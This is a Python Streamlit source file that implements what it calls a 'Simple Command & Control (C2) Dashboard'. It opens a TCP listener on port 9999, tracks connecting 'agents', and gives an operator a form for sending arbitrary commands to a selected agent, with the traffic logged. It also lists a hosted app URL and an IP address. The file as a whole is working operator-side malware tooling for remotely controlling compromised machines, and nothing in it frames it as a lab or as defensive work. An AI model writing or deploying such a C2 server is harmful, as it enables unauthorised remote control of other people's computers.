import streamlit as st
import socket
import threading
import requests

# Simple C2 Server Implementation
st.set_page_config(layout="wide", page_title="Simple C2 Dashboard")

# Function to get master node URL (since hosted on Streamlit Cloud, use app URL)
master_url = "https://m-dashboardpy-app9jfrumktgxrf359vu6t6.streamlit.app/"  # Replace with your Streamlit app URL
master_ip = "10.12.175.191"  # IP address displayed on the hosting site

# Display Master Node URL and IP in the Sidebar
st.sidebar.write("Master Node URL:")
st.sidebar.write(master_url)
st.sidebar.write("Master Node IP Address:")
st.sidebar.write(master_ip)

# Sidebar - App title and input widgets
st.sidebar.title("Simple Command & Control (C2) Dashboard")

# Columns Layout
col1, col2 = st.columns([1, 2])

# Placeholder for connected agents
targets = []

# Function to start the server and listen for connections
def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    while True:
        client, address = server.accept()
        targets.append((client, address))
        st.session_state['logs'] += f"\n[+] Connection established from {address}"

# Start server in a separate thread
def run_server():
    threading.Thread(target=start_server, args=("0.0.0.0", 9999), daemon=True).start()

# Start server if not already started
if 'logs' not in st.session_state:
    st.session_state['logs'] = "[INFO] Starting Simple C2 Server..."
    run_server()

# Column 1 - Connected Agents
with col1:
    st.subheader("Connected Agents")
    if targets:
        for i, target in enumerate(targets):
            st.write(f"Agent {i+1}: {target[1]}")
    else:
        st.write("No agents connected.")

# Column 2 - Command Execution
with col2:
    st.subheader("Command Execution")
    if targets:
        selected_agent = st.selectbox("Select Agent", options=[f"Agent {i+1}" for i in range(len(targets))])
        command = st.text_input("Enter Command to Execute")
        if st.button("Send Command"):
            agent_index = int(selected_agent.split()[1]) - 1
            client_socket = targets[agent_index][0]
            try:
                client_socket.send(command.encode())
                st.session_state['logs'] += f"\n[+] Sent command to {targets[agent_index][1]}: {command}"
            except Exception as e:
                st.session_state['logs'] += f"\n[ERROR] Failed to send command: {str(e)}"

# Display Logs
st.subheader("Logs")
st.text_area("Logs", st.session_state['logs'], height=300)
